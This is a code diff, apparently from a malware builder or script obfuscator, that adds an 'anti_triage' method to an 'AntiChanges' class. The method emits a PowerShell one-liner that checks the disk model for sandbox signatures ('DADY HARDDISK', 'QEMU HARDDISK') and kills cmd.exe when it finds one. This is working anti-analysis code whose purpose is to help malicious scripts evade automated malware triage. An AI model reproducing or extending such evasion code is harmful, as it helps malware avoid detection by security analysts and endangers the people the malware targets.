@@ -61,6 +61,13 @@ class AntiChanges:
         # return codes[0]
 
     @staticmethod
+    def anti_triage():
+        code = [
+            '''powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"''',
+        ]
+        return random.choice(code)
+
+    @staticmethod
     def anti_wifi() -> str:
         # if Settings.require_wifi:
         #    # Ping request could not find host www.google.com. Please check the name and try again.
